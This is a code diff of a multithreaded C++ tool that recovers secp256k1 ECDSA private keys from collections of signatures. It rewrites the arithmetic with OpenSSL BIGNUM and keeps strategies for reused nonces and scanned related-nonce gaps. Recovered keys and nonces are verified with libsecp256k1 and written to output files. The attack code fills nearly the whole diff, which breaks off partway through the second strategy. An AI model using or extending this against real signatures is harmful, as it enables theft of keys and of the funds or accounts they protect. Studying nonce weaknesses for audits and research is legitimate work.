@@ -1,7 +1,7 @@
 // ecdsa_recover_strict.cpp
 // Build:
 /*
-sudo apt-get update && sudo apt-get install -y g++ libsecp256k1-dev libssl-dev libboost-dev
+sudo apt-get update && sudo apt-get install -y g++ libsecp256k1-dev libssl-dev
 g++ -O3 -march=native -flto -fexceptions -pthread -std=c++17 \
     ecdsa_recover_strict.cpp -o ecdsa_recover_strict \
     -lsecp256k1 -lcrypto -lpthread -Wno-deprecated-declarations
@@ -30,15 +30,11 @@ g++ -O3 -march=native -flto -fexceptions -pthread -std=c++17 \
 #include <openssl/rand.h>
 #include <openssl/crypto.h>
 
-#include <boost/multiprecision/cpp_int.hpp>
-
 using namespace std;
-using boost::multiprecision::cpp_int;
 namespace fs = std::filesystem;
 
 // ------------------------------- Global Constraints & Constants -------------------------------
 static const char* N_HEX = "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141";
-static cpp_int SECP256K1_N;
 
 // Basic String Helpers
 static inline string hexlower(const string& s) {
@@ -74,15 +70,7 @@ static vector<unsigned char> from_hex(const string& hex) {
     return res;
 }
 
-static void sha256_once(const unsigned char* in, size_t len, unsigned char out[32]) {
-    SHA256_CTX c;
-    SHA256_Init(&c);
-    SHA256_Update(&c, in, len);
-    SHA256_Final(out, &c);
-}
-
 // ------------------------------- Simple Micro-JSON Parser -------------------------------
-// Hand-rolled to keep zero-dependency architecture outside boost & native headers
 static string extract_json_field(const string& line, const string& key) {
     size_t pos = line.find("\"" + key + "\"");
     if (pos == string::npos) return "";
@@ -93,7 +81,6 @@ static string extract_json_field(const string& line, const string& key) {
         size_t end = line.find("\"", start + 1);
         if (end != string::npos) return line.substr(start + 1, end - start - 1);
     } else {
-        // Fallback for numeric tokens unquoted
         size_t run = pos + 1;
         while(run < line.size() && (isspace(line[run]) || line[run] == ',' || line[run] == ':')) run++;
         size_t vend = run;
@@ -112,13 +99,15 @@ struct SignatureEntry {
     string r_hex;
     string s_hex;
     int v = -1;
-    string pub_hex; // Known public key constraint if provided
+    string pub_hex;
     
-    // Derived bignums
-    cpp_int r, s, z;
+    // Extracted Hex representations for high-performance context allocation per thread
+    string r_clean;
+    string s_clean;
+    string z_clean;
 };
 
-// Global Thread Safe Thread Write Managers
+// Global Thread Safe Managers
 static mutex g_out_mutex;
 static ofstream g_out_json_f;
 static ofstream g_out_txt_f;
@@ -130,20 +119,10 @@ static atomic<long long> g_total_iterations(0);
 static atomic<long long> g_keys_cracked(0);
 
 // ------------------------------- Key Derivation Validation -------------------------------
-static bool verify_and_log_privkey(const cpp_int& priv, const SignatureEntry& entry, const string& source_method) {
-    if (priv <= 0 || priv >= SECP256K1_N) return false;
-    
-    // Check duplication profiles
-    stringstream ss;
-    ss << std::hex << priv;
-    string p_hex = hexlower(ss.str());
-    while(p_hex.size() < 64) p_hex = "0" + p_hex;
-
+static bool verify_and_log_privkey(const string& p_hex, const SignatureEntry& entry, const string& source_method) {
     lock_guard<mutex> lock(g_out_mutex);
-    if (g_found_privkeys.count(p_hex)) return true; // Already discovered
+    if (g_found_privkeys.count(p_hex)) return true;
     
-    // Verify math explicitly matching: s = k^-1 * (z + r*x) mod n => test if matching pubkey if given
-    // Fast verification via secp256k1 context
     secp256k1_context* ctx = secp256k1_context_create(SECP256K1_CONTEXT_SIGN | SECP256K1_CONTEXT_VERIFY);
     vector<unsigned char> priv_bytes = from_hex(p_hex);
     secp256k1_pubkey pubkey;
@@ -154,7 +133,6 @@ static bool verify_and_log_privkey(const cpp_int& priv, const SignatureEntry& en
         secp256k1_ec_pubkey_serialize(ctx, pub_compressed, &out_len, &pubkey, SECP256K1_EC_COMPRESSED);
         string computed_pub = to_hex(pub_compressed, out_len);
         
-        // Write outputs
         g_found_privkeys.insert(p_hex);
         g_keys_cracked++;
         
@@ -174,39 +152,51 @@ static bool verify_and_log_privkey(const cpp_int& priv, const SignatureEntry& en
     return false;
 }
 
-// Extract Private Key using a solved ephemeral candidate k
-static bool test_k_candidate(const cpp_int& k, const SignatureEntry& entry, const string& method) {
-    if (k <= 0 || k >= SECP256K1_N) return false;
+// Extract Private Key using a solved ephemeral candidate k via native OpenSSL BIGNUM API
+static bool test_k_candidate(BIGNUM* k, const BIGNUM* r, const BIGNUM* s, const BIGNUM* z, const BIGNUM* N, BN_CTX* ctx, const SignatureEntry& entry, const string& method) {
+    if (BN_is_zero(k) || BN_cmp(k, N) >= 0) return false;
     
-    // x = r^-1 * (s * k - z) mod n
-    cpp_int r_inv = boost::multiprecision::miller_rabin_test(SECP256K1_N, 5) ? 0 : 1; 
-    // Fallback manual modular inverse via Extended Euclidean
-    cpp_int t = 0, newt = 1;
-    cpp_int r_val = SECP256K1_N, newr = entry.r;
-    while (newr != 0) {
-        cpp_int quotient = r_val / newr;
-        t = t - quotient * newt; swap(t, newt);
-        r_val = r_val - quotient * newr; swap(r_val, newr);
-    }
-    if (r_val > 1) return false; // Not invertible
-    if (t < 0) t += SECP256K1_N;
-    r_inv = t;
+    BIGNUM* r_inv = BN_new();
+    BIGNUM* sk = BN_new();
+    BIGNUM* sk_z = BN_new();
+    BIGNUM* priv = BN_new();
+    bool success = false;
 
-    cpp_int sk = (entry.s * k) % SECP256K1_N;
-    cpp_int sk_z = (sk - entry.z) % SECP256K1_N;
-    if (sk_z < 0) sk_z += SECP256K1_N;
-    
-    cpp_int priv = (sk_z * r_inv) % SECP256K1_N;
-    
-    if (verify_and_log_privkey(priv, entry, method)) {
-        if (g_out_k_f.is_open()) {
-            stringstream skk; skk << std::hex << k;
-            lock_guard<mutex> lock(g_out_mutex);
-            g_out_k_f << "{\"index\":\"" << entry.index << "\",\"k_hex\":\"" << skk.str() << "\"}\n" << flush;
+    // r_inv = r^-1 mod N
+    if (BN_mod_inverse(r_inv, r, N, ctx)) {
+        // sk = (s * k) mod N
+        BN_mod_mul(sk, s, k, N, ctx);
+        // sk_z = (sk - z) mod N
+        BN_mod_sub(sk_z, sk, z, N, ctx);
+        // priv = (sk_z * r_inv) mod N
+        BN_mod_mul(priv, sk_z, r_inv, N, ctx);
+
+        char* hex_str = BN_bn2hex(priv);
+        if (hex_str) {
+            string p_hex = hexlower(string(hex_str));
+            OPENSSL_free(hex_str);
+            while(p_hex.size() < 64) p_hex = "0" + p_hex;
+
+            if (verify_and_log_privkey(p_hex, entry, method)) {
+                if (g_out_k_f.is_open()) {
+                    char* k_hex_str = BN_bn2hex(k);
+                    if (k_hex_str) {
+                        string k_hex = hexlower(string(k_hex_str));
+                        OPENSSL_free(k_hex_str);
+                        lock_guard<mutex> lock(g_out_mutex);
+                        g_out_k_f << "{\"index\":\"" << entry.index << "\",\"k_hex\":\"" << k_hex << "\"}\n" << flush;
+                    }
+                }
+                success = true;
+            }
         }
-        return true;
     }
-    return false;
+
+    BN_free(r_inv);
+    BN_free(sk);
+    BN_free(sk_z);
+    BN_free(priv);
+    return success;
 }
 
 // ------------------------------- Worker Engine Core -------------------------------
@@ -216,48 +206,65 @@ void execution_worker(int thread_id, const vector<SignatureEntry>& entries,
                       long long lcg_a_max, long long lcg_b_max, int lcg_per_pair_cap,
                       int scan_rand_k) {
     
+    BN_CTX* ctx = BN_CTX_new();
+    BIGNUM* N = BN_new();
+    BN_hex2bn(&N, N_HEX);
+
+    // Track state buffers
+    BIGNUM* top = BN_new();
+    BIGNUM* bot = BN_new();
+    BIGNUM* bot_inv = BN_new();
+    BIGNUM* k_sol = BN_new();
+    BIGNUM* r_ratio = BN_new();
+    BIGNUM* e2_r_inv = BN_new();
+    BIGNUM* num = BN_new();
+    BIGNUM* den = BN_new();
+    BIGNUM* den_inv = BN_new();
+    BIGNUM* tmp = BN_new();
+    BIGNUM* target_k_delta = BN_new();
+    BIGNUM* bn_a = BN_new();
+    BIGNUM* bn_b = BN_new();
+
     size_t total = entries.size();
-    // Round-robin index distribution across concurrent native worker threads
     for (size_t i = thread_id; i < total; i += max_iter) {
         const auto& e1 = entries[i];
+        BIGNUM* e1_r = BN_new(); BN_hex2bn(&e1_r, e1.r_clean.c_str());
+        BIGNUM* e1_s = BN_new(); BN_hex2bn(&e1_s, e1.s_clean.c_str());
+        BIGNUM* e1_z = BN_new(); BN_hex2bn(&e1_z, e1.z_clean.c_str());
         
-        // Loop pairings for comparison optimizations
         for (size_t j = i + 1; j < total; j++) {
             const auto& e2 = entries[j];
+            BIGNUM* e2_r = BN_new(); BN_hex2bn(&e2_r, e2.r_clean.c_str());
+            BIGNUM* e2_s = BN_new(); BN_hex2bn(&e2_s, e2.s_clean.c_str());
+            BIGNUM* e2_z = BN_new(); BN_hex2bn(&e2_z, e2.z_clean.c_str());
+
             g_total_iterations++;
             
-            // --- Strategy 1: Shared k analysis (Reused nonce detection) ---
-            if (e1.r == e2.r && e1.s != e2.s) {
-                // k = (z1 - z2) / (s1 - s2) mod n
-                cpp_int top = (e1.z - e2.z) % SECP256K1_N; if (top < 0) top += SECP256K1_N;
-                cpp_int bot = (e1.s - e2.s) % SECP256K1_N; if (bot < 0) bot += SECP256K1_N;
-                
-                cpp_int t = 0, newt = 1;
-                cpp_int r_val = SECP256K1_N, newr = bot;
-                while (newr != 0) {
-                    cpp_int quotient = r_val / newr;
-                    t = t - quotient * newt; swap(t, newt);
-                    r_val = r_val - quotient * newr; swap(r_val, newr);
-                }
-                if (r_val == 1) {
-                    if (t < 0) t += SECP256K1_N;
-                    cpp_int k = (top * t) % SECP256K1_N;
-                    test_k_candidate(k, e1, "Shared Nonce (k1=k2)");
+            // --- Strategy 1: Shared k analysis ---
+            if (BN_cmp(e1_r, e2_r) == 0 && BN_cmp(e1_s, e2_s) != 0) {
+                BN_mod_sub(top, e1_z, e2_z, N, ctx);
+                BN_mod_sub(bot, e1_s, e2_s, N, ctx);
+                if (BN_mod_inverse(bot_inv, bot, N, ctx)) {
+                    BN_mod_mul(k_sol, top, bot_inv, N, ctx);
+                    test_k_candidate(k_sol, e1_r, e1_s, e1_z, N, ctx, e1, "Shared Nonce (k1=k2)");
                 }
             }
 
-            // --- Strategy 2: Differential Gap Multipliers ---
-            int pair_dg_count = 0;
-            for (long long seed : dg_seeds) {
-                if (pair_dg_count >= dg_per_pair_cap) break;
-                
-                // Scan explicit bounds surrounding seeds (+/- step sequences)
-                for (long long delta = -dg_max_delta; delta <= dg_max_delta; delta += dg_fill_step) {
+            // Precompute shared scaling properties for systems calculations
+            if (BN_mod_inverse(e2_r_inv, e2_r, N, ctx)) {
+                BN_mod_mul(r_ratio, e1_r, e2_r_inv, N, ctx);
+
+                // --- Strategy 2: Differential Gap Multipliers ---
+                int pair_dg_count = 0;
+                for (long long seed : dg_seeds) {
                     if (pair_dg_count >= dg_per_pair_cap) break;
                     
-                    cpp_int target_k_delta = seed + delta;
-                    if (target_k_delta <= 0) continue;
-                    pair_dg_count++;
+                    for (long long delta = -dg_max_delta; delta <= dg_max_delta; delta += dg_fill_step) {
+                        long long val = seed + delta;
+                        if (val <= 0) continue;
+                        pair_dg_count++;
 
-                    // Test k2 = k1 + target_k_delta
-                    // s1 = (z1 + r1*x)/k1, s2 = (z2 + r2*x)/(k1 + delta) => solve systems
+                        BN_set_word(target_k_delta, (unsigned long long)val);
+
+                        // num = (s2 * delta - z1 + r_ratio * z2) mod N
+                        BN_mod_mul(tmp, e2_s, target_k_delta, N, ctx);
